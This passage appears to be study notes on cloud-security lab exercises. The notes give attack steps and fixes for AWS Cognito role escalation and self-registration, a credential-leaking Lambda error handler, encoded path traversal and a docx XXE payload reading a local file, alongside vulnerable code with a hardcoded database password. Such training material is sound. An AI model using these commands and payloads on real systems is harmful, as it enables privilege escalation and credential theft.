    ssl_certificate /etc/letsencrypt/live/proxy-jumpbox.cloudbilling.net/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/proxy-jumpbox.cloudbilling.net/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
}
```

> https://guest.application.security/exercises/505
* Misconfigured AWS Cognito Attributes :- Login for kyc verification -> Relogin but this time intercept it -> It is using Amplify framework -> After successful login we have an access token -> Using aws cli "aws cognito-idp get-user --access-token $token" -> we get user details -> in there json
```json
"Name": "custom:role",
"Value": "kycuser"
```
-> Use cli to update role "aws cognito-idp update-user-attributes --access-token $token --user-attributes Name="custom:role",Value="admin" -> Relogin and we have admin access

Cause 
```text
The link loads the App clients configuration page for the DigitalCOIN KYC application. Scroll down to the Attributes section to review the Writeable Attributes.
Reviewing the configuration, we can quickly see the problem. DigitalCOIN's developers have mistakenly enabled write access for the user attribute custom:role allowing Bob to update/change his custom:role attribute to admin.
If this attribute was set to read-only access, Bob's attempt to update the custom:role attribute would fail with the following error: NotAuthorizedException.
```
  - Mitigation :- Developers must be aware when configuring their applications' user attributes settings to audit and revoke write access for any attributes whose value can influence the control flow or bypass the security model of an application.
  
  In the case of DigitalCOIN's KYC website, the developers mistakenly granted the custom user attribute custom:role with write access, allowing Bob to modify the user attribute and escalate his privilege.

  To resolve the issue, go ahead and revoke write access for the custom:role attribute by unchecking the option.

> https://guest.application.security/exercises/506
* Misconfigured AWS Cognito profile allows self-registration :- Login to panel, intercept the request -> POST request contains "ClientID" -> Self register via aws "aws cognito-idp sign-up --client-id 7qmc1r7du27k2c0j6h13r9u6g8 --username bob@livemail.com --password passw0rd" -> Fails due to password policy -> New request "aws cognito-idp sign-up --client-id 7qmc1r7du27k2c0j6h13r9u6g8 --username bob@livemail.com --password Passw0rd!" -> Sucess 

Cause :
  The link loads the user pool policy page for the BBG Newsroom application’s Cognito profile bbg-prod-auth
  Reviewing the configuration, we can quickly see the problem. BBG's developers have left the user pool option 'Allow users to sign themselves up' enabled. The option is used to specify whether to allow users to sign themselves up and is set by default
  This option further enables the SignUp API which can be accessed via AWS CLI and opens the application to a hidden attack surface that BBG’s software developers hadn't considered.
  If it was disabled, only BBG administrators would be able to create users in the bbg-prod-auth user pool and Bob's attempt to invoke the SignUp API would fail with the following error:
   NotAuthorizedException  

 - Mtigation :- 
  Amazon Cognito’s User Pools offer developers a comprehensive set of authentication workflows for creating a secure, scalable user pool (identity provider) that enables them to focus more on the business-specific features of their application.

  However, developers must be aware when configuring their applications' User Pool settings to review and disable all unused authentication workflows and not simply rely on hiding or disabling such features on the front end. 

  In the case of BBG’s Newsroom Portal, the developers simply removed the Sign-Up link from their login page but failed to disable it in their Cognito configuration.

  To resolve the issue, go ahead and disable the Self Registration feature by choosing the Only allow administrators to create users option.

> https://guest.application.security/exercises/507
* Excessive Logging :- Login -> Upload an invalid file -> Fail upload message -> See in burp -> Error leaks aws security creds
```java
package com.serverless;

import java.util.Collections;
import java.util.Map;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.RequestHandler;
import com.amazonaws.services.lambda.runtime.events.APIGatewayProxyRequestEvent;
import com.amazonaws.services.lambda.runtime.events.APIGatewayProxyResponseEvent;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import org.json.simple.JSONObject;

import java.util.HashMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.fileupload.MultipartStream;

import com.amazonaws.services.s3.AmazonS3;
import com.amazonaws.services.s3.AmazonS3ClientBuilder;
import com.amazonaws.services.s3.model.ObjectMetadata;

public class Handler implements RequestHandler<APIGatewayProxyRequestEvent, APIGatewayProxyResponseEvent> {

  private static final Logger LOG = LogManager.getLogger(Handler.class);
  Gson gson = new GsonBuilder().setPrettyPrinting().create();

  String clientRegion = "eu-west-2";
  String bucketName = "om-fileupload";

    @Override
    public APIGatewayProxyResponseEvent handleRequest(APIGatewayProxyRequestEvent input, Context context) {

    APIGatewayProxyResponseEvent apiGatewayProxyResponseEvent = new APIGatewayProxyResponseEvent();
    Map<String, String> responseBody = new HashMap<String, String>();

        try {
      LOG.info("received: {}", input.toString());

      // get report id from query parameter
      String inputParams = input.getBody();
      LOG.info("input: {}", inputParams);

      byte[] bI = Base64.decodeBase64(inputParams.getBytes());
      ByteArrayInputStream content = new ByteArrayInputStream(inputParams.getBytes());

      Map<String, String> hps = input.getHeaders();
      String contentType = "";

            if (hps != null) {
        contentType = hps.get("Content-Type");
      }

      String[] boundaryArray = contentType.split("=");

            //Transform the boundary to a byte array
      byte[] boundary = boundaryArray[1].getBytes();

      MultipartStream multipartStream =
        new MultipartStream(content, boundary, bI.length, null);
      boolean nextPart = multipartStream.skipPreamble();

      //Create a ByteArrayOutputStream
      ByteArrayOutputStream fileData = new ByteArrayOutputStream();
      String fileName = "";
      String fileType = "";

      while (nextPart) {
        String header = multipartStream.readHeaders();

        String[] contentDispositionHeader = header.split(";");
        for (String name : contentDispositionHeader) {
          if ((name.trim().startsWith("filename"))) {
            String[] tmp = name.split("=");
            fileName = tmp[1].trim().replaceAll("\"","").split("\n")[0].trim();
            fileType = tmp[1].split(":")[1].trim();
          }
        }

                //Write out the file to our ByteArrayOutputStream
                multipartStream.readBodyData(fileData);
                //Get the next part, if any
                nextPart = multipartStream.readBoundary();
      }

      if (fileType.startsWith("image/")) {
        LOG.info("type: image");
        // parse_image(fileData);
      } else if (fileType.startsWith("video/")) {
        LOG.info("type: video");
        // parse_video(fileData);
      } else if (fileType.equals("application/pdf")) {
        LOG.info("type: pdf");
        // parse_pdf(fileData);
      } else if (fileType.equals("application/rtf")) {
        LOG.info("type: rtf");
        // parse_pdf(fileData);
      } else {
        // Error: Invalid Data - File Type
                responseBody.put("context", gson.toJson(context));
        responseBody.put("request", gson.toJson(input));
        responseBody.put("error", "Invalid file type");
        responseBody.put("env", gson.toJson(System.getenv()));

        return generateResponse(apiGatewayProxyResponseEvent, responseBody, 400);
      }

      //Prepare an InputStream from the ByteArrayOutputStream
            InputStream fis = new ByteArrayInputStream(fileData.toByteArray());
          
            //Create our S3Client Object
            AmazonS3 s3Client = AmazonS3ClientBuilder.standard()
                    .withRegion(clientRegion)
          .build();

      //Configure the file metadata
            ObjectMetadata metadata = new ObjectMetadata();
            metadata.setContentLength(fileData.toByteArray().length);
            metadata.setContentType(fileType);
            metadata.setCacheControl("public, max-age=31536000");

            //Put file into S3
            s3Client.putObject(bucketName, fileName, fis, metadata);

      responseBody.put("message", "success");

      String url = "https://" + bucketName + ".s3." + clientRegion +".amazonaws.com/" + fileName;
      responseBody.put("image_url", url);

      return generateResponse(apiGatewayProxyResponseEvent, responseBody, 200);
    } catch (Throwable e) {
      // Catch all other errors
      e.printStackTrace();

      responseBody.put("message", "Something went wrong");
      return generateResponse(apiGatewayProxyResponseEvent, responseBody, 500);
    }
  }

    private APIGatewayProxyResponseEvent generateResponse(
    APIGatewayProxyResponseEvent apiGatewayProxyResponseEvent,
    Map<String, String> requestMessage, Integer statusCode) {

    apiGatewayProxyResponseEvent.setHeaders(
      Collections.singletonMap("timeStamp", String.valueOf(System.currentTimeMillis()))
    );
    apiGatewayProxyResponseEvent.setStatusCode(statusCode);
    apiGatewayProxyResponseEvent.setBody(
      new JSONObject(requestMessage).toJSONString()
    );

    return apiGatewayProxyResponseEvent;
    }
}
```
  - Mitigation :- In order to mitigate against deploying active debugging code in production instances, developers must ensure appropriate permissions and access-control settings are applied for accessing such features.

  Alternatively, development teams can add conditional variables to remove debugging code when deploying in production and staging environments.

```java
package com.serverless;

import java.util.Collections;
import java.util.Map;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.amazonaws.services.lambda.runtime.Context;
import com.amazonaws.services.lambda.runtime.RequestHandler;
import com.amazonaws.services.lambda.runtime.events.APIGatewayProxyRequestEvent;
import com.amazonaws.services.lambda.runtime.events.APIGatewayProxyResponseEvent;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import org.json.simple.JSONObject;

import java.util.HashMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.fileupload.MultipartStream;

import com.amazonaws.services.s3.AmazonS3;
import com.amazonaws.services.s3.AmazonS3ClientBuilder;
import com.amazonaws.services.s3.model.ObjectMetadata;

public class Handler implements RequestHandler<APIGatewayProxyRequestEvent, APIGatewayProxyResponseEvent> {

  private static final Logger LOG = LogManager.getLogger(Handler.class);
  Gson gson = new GsonBuilder().setPrettyPrinting().create();

  String clientRegion = "eu-west-2";
  String bucketName = "om-fileupload";

    @Override
    public APIGatewayProxyResponseEvent handleRequest(APIGatewayProxyRequestEvent input, Context context) {

    APIGatewayProxyResponseEvent apiGatewayProxyResponseEvent = new APIGatewayProxyResponseEvent();
    Map<String, String> responseBody = new HashMap<String, String>();

        try {
      LOG.info("received: {}", input.toString());

      // get report id from query parameter
      String inputParams = input.getBody();
      LOG.info("input: {}", inputParams);

      byte[] bI = Base64.decodeBase64(inputParams.getBytes());
      ByteArrayInputStream content = new ByteArrayInputStream(inputParams.getBytes());

      Map<String, String> hps = input.getHeaders();
      String contentType = "";

            if (hps != null) {
        contentType = hps.get("Content-Type");
      }

      String[] boundaryArray = contentType.split("=");

            //Transform the boundary to a byte array
      byte[] boundary = boundaryArray[1].getBytes();

      MultipartStream multipartStream =
        new MultipartStream(content, boundary, bI.length, null);
      boolean nextPart = multipartStream.skipPreamble();

      //Create a ByteArrayOutputStream
      ByteArrayOutputStream fileData = new ByteArrayOutputStream();
      String fileName = "";
      String fileType = "";

      while (nextPart) {
        String header = multipartStream.readHeaders();

        String[] contentDispositionHeader = header.split(";");
        for (String name : contentDispositionHeader) {
          if ((name.trim().startsWith("filename"))) {
            String[] tmp = name.split("=");
            fileName = tmp[1].trim().replaceAll("\"","").split("\n")[0].trim();
            fileType = tmp[1].split(":")[1].trim();
          }
        }

                //Write out the file to our ByteArrayOutputStream
                multipartStream.readBodyData(fileData);
                //Get the next part, if any
                nextPart = multipartStream.readBoundary();
      }

      if (fileType.startsWith("image/")) {
        LOG.info("type: image");
        // parse_image(fileData);
      } else if (fileType.startsWith("video/")) {
        LOG.info("type: video");
        // parse_video(fileData);
      } else if (fileType.equals("application/pdf")) {
        LOG.info("type: pdf");
        // parse_pdf(fileData);
      } else if (fileType.equals("application/rtf")) {
        LOG.info("type: rtf");
        // parse_pdf(fileData);
      } else {
        // Error: Invalid Data - File Type
        responseBody.put("error", "Invalid file type");

        if (Boolean.valueOf(System.getenv("DEBUG"))) {
                    responseBody.put("env", gson.toJson(System.getenv()));
        }

        if (System.getenv("HTTP_TRACE_REQUEST").equals("RAW_HTTP_REQUEST")) {
          responseBody.put("request", gson.toJson(input));
          responseBody.put("context", gson.toJson(context));
        }

        return generateResponse(apiGatewayProxyResponseEvent, responseBody, 400);
      }

      //Prepare an InputStream from the ByteArrayOutputStream
            InputStream fis = new ByteArrayInputStream(fileData.toByteArray());
          
            //Create our S3Client Object
            AmazonS3 s3Client = AmazonS3ClientBuilder.standard()
                    .withRegion(clientRegion)
          .build();

      //Configure the file metadata
            ObjectMetadata metadata = new ObjectMetadata();
            metadata.setContentLength(fileData.toByteArray().length);
            metadata.setContentType(fileType);
            metadata.setCacheControl("public, max-age=31536000");

            //Put file into S3
            s3Client.putObject(bucketName, fileName, fis, metadata);

      responseBody.put("message", "success");

      String url = "https://" + bucketName + ".s3." + clientRegion +".amazonaws.com/" + fileName;
      responseBody.put("image_url", url);

      return generateResponse(apiGatewayProxyResponseEvent, responseBody, 200);
    } catch (Throwable e) {
      // Catch all other errors
      e.printStackTrace();

      responseBody.put("message", "Something went wrong");
      return generateResponse(apiGatewayProxyResponseEvent, responseBody, 500);
    }
  }

    private APIGatewayProxyResponseEvent generateResponse(
    APIGatewayProxyResponseEvent apiGatewayProxyResponseEvent,
    Map<String, String> requestMessage, Integer statusCode) {

    apiGatewayProxyResponseEvent.setHeaders(
      Collections.singletonMap("timeStamp", String.valueOf(System.currentTimeMillis()))
    );
    apiGatewayProxyResponseEvent.setStatusCode(statusCode);
    apiGatewayProxyResponseEvent.setBody(
      new JSONObject(requestMessage).toJSONString()
    );

    return apiGatewayProxyResponseEvent;
    }
}
```

> https://guest.application.security/exercises/508
* Dangerous Dependencies :- Visit homepage -> View source (has js and static folders) -> Trying "../../" in url fails and "/static/public" is permission denied -> Trying encoded "../../" and performing "curl 'https://41.208.179.119/static/public/%2e%2e/%2e%2e/ '" we get the directory listing -> Get creds from "curl https://41.208.179.119/static/public/%2e%2e/%2e%2e/config/config.js " file -> This is due to npm having this vulnerbility from a long time

  - Mitigation :-
  To sum up, vulnerable dependencies are introduced when a web application dependency is unsupported, out of date, or vulnerable to a known exploit.
  To effectively mitigate against vulnerable dependencies in your project, developers must regularly audit software components and their dependencies, making sure the third-party libraries and software dependencies are always up-to-date.
  Product teams must further establish security policies governing the use of third-party libraries, such as 
  passing security tests, and regular patching and updating of application dependencies. 

> https://guest.application.security/exercises/509
* Lambda XXE Injection :- Upload your resume in docx format -> The website renders it and fetches the contents -> Unzip the docx file in linux and edit the document.xml file
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE loadthis [<!ELEMENT loadthis ANY >
<!ENTITY somefile SYSTEM "file:////var/task/handler.py" >]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 wp14">
   <w:body>
<loadthis>&somefile;</loadthis>
      <w:p w:rsidR="009F1856" w:rsidRPr="006310CC" w:rsidRDefault="006310CC" w:rsidP="006310CC">
         <w:pPr>
```  
-> Zip it back and upload it, we get xxe injection and source code is retrived

Vuln Code :
```python
import json
import base64
import boto3
import zipfile
import pymysql.cursors
from lxml import etree
from io import BytesIO
from cgi import parse_multipart, parse_header


def create_entry(email, content):
    connection = pymysql.connect(
            host='18.130.77.17',
            user='root',
            password='a23fT7e39-feq',
            database='pixto',
            cursorclass=pymysql.cursors.DictCursor)

    with connection:
        with connection.cursor() as cursor:
            sql = "INSERT INTO applications (email, resume_content) VALUES (%s, %s);"
            cursor.execute(sql, (email, content))

        connection.commit()


def upload(event, context):
    print(event)

    response = None

    try:
        # get headers from request
        c_type, c_data = parse_header(event['headers']['Content-Type'])
        c_data['boundary'] = bytes(c_data['boundary'], "utf-8")

        decoded_string = base64.b64decode(event['body'])

        # parse multipart/form-data
        form_data = parse_multipart(BytesIO(decoded_string), c_data)
        content_bytes = form_data['resume'][0]
        content_io = BytesIO(content_bytes)

        # extract xml from doc file
        z = zipfile.ZipFile(content_io)
        doc_file = z.read('word/document.xml')

        # parse xml document
        parser = etree.XMLParser() # misconfig here 
        document = etree.fromstring(doc_file, parser)

        document_string = ''.join(document.itertext())

        email = form_data['email'][0]
        create_entry(email, document_string)

        response = {
            "statusCode": 200,
            "body": json.dumps({
                "status": "success",
                "message": "Uploaded Successfully",
                "data": document_string
            })
        }

    except Exception as e:
        print(e)
        response = {
            "statusCode": 500,
            "body": json.dumps({
                "status": "failed",
                "message": "Something went wrong"
            })
        }

    return response
```
  - Mitigation :- In order to effectively mitigate against XXE injection attacks, developers must configure their application's XML parsers to disable the parsing of XML eXternal Entities (XXE) and Document Type Definitions (DTD) when parsing XML documents.
  If DTDs cannot be completely disabled, developers must disable the parsing of external general entities and external parameter entities when parsing untrusted XML files.

```python
import json
import base64
import boto3
import zipfile
import os
import pymysql.cursors
from lxml import etree
from io import BytesIO
from cgi import parse_multipart, parse_header


def create_entry(email, content):
    connection = pymysql.connect(
            host=os.environ['DB_HOST'],
            user=os.environ['DB_USER'],
            password=os.environ['DB_PASSWORD'],
            database=os.environ['DB_NAME'],
            cursorclass=pymysql.cursors.DictCursor)

    with connection:
        with connection.cursor() as cursor:
            sql = "INSERT INTO applications (email, resume_content) VALUES (%s, %s);"
            cursor.execute(sql, (email, content))

        connection.commit()


def upload(event, context):
    print(event)

    response = None

    try:
        # get headers from request
        c_type, c_data = parse_header(event['headers']['Content-Type'])
        c_data['boundary'] = bytes(c_data['boundary'], "utf-8")

        decoded_string = base64.b64decode(event['body'])

        # parse multipart/form-data
        form_data = parse_multipart(BytesIO(decoded_string), c_data)
        content_bytes = form_data['resume'][0]
        content_io = BytesIO(content_bytes)

        # extract xml from doc file
        z = zipfile.ZipFile(content_io)
        doc_file = z.read('word/document.xml')

        # parse xml document
        parser = etree.XMLParser(resolve_entities=False, no_network=True) # Fixed Code
        document = etree.fromstring(doc_file, parser)

        document_string = ''.join(document.itertext())

        email = form_data['email'][0]
        create_entry(email, document_string)

        response = {
            "statusCode": 200,
            "body": json.dumps({
                "status": "success",
                "message": "Uploaded Successfully",
                "data": document_string
            })
        }

    except Exception as e:
        print(e)
        response = {
            "statusCode": 500,
            "body": json.dumps({
                "status": "failed",
                "message": "Something went wrong"
            })
        }

    return response
```

